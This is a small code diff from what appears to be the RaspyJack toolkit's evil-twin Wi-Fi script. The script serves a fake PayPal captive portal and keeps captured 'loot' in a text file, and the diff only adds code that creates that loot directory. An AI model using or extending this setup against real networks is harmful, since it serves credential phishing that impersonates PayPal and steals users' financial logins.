@@ -78,6 +78,11 @@ CAPTIVE_PORTAL_BASE_PATH = os.path.join(RASPYJACK_DIR, "DNSSpoof", "sites")
 CAPTIVE_PORTAL_PATH = os.path.join(CAPTIVE_PORTAL_BASE_PATH, "paypal")
 LOOT_FILE = os.path.join(CAPTIVE_PORTAL_PATH, "loot.txt")
 TEMP_CONF_DIR = "/tmp/raspyjack_eviltwin_paypal/"
+# Ensure loot path exists
+try:
+    os.makedirs(os.path.dirname(LOOT_FILE), exist_ok=True)
+except Exception:
+    pass
 
 current_html_file = "paypal"
 html_files_list = []
